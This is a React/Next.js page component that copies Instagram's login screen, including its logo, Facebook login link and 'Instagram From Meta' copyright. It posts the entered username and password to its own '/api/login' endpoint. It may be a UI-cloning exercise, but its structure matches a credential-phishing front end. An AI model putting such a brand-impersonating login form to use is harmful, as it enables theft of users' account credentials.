'use client'

import axios from 'axios'
import React, { useState } from 'react'

export default function page() {
  const [val,setVal]=useState({num:'',pass:''})
  const handleClick=async()=>{
    if(val.num != '' && val .pass!= ''){
      const res=await axios.post('/api/login',val);

    console.log(res.data);
    }
    
  }
  return (
    <div>
          <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex">
        </section>
        <section id="auth" className="flex direction-column">
            <div className="panel login flex direction-column">
                <h1 title="Instagram" className="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label htmlFor="email" className="sr-only">Phone, username or email</label>
                    <input name="email" value={val.num} onChange={(e)=>{setVal({num:e.target.value,pass:val.pass})}} placeholder="Phone, username or email" />

                    <label htmlFor="password" className="sr-only">Password</label>
                    <input name="password" value={val.pass} onChange={(e)=>{setVal({pass:e.target.value,num:val.num})}}  type="password" placeholder="Password" />

                    <button type="button"  style={{cursor:'pointer'}} onClick={handleClick}>Log in</button>
                </form>
                <div className="flex separator align-items-center">
                    <span></span>
                    <div className="or">OR</div>
                    <span></span>
                </div>
                <div className="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href='/'>Log In With Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div className="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Register</a>
            </div>
            <div className="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div className="flex justify-content-center">
                    <img style={{cursor:'pointer'}} src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img style={{cursor:'pointer'}} src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul className="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">ACCOUNTS MORE RELEVANT </a></li>
            <li><a href="#">HASTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p className="copyright">© 2023 Instagram From Meta</p>
    </footer>
    </div>
  )
}
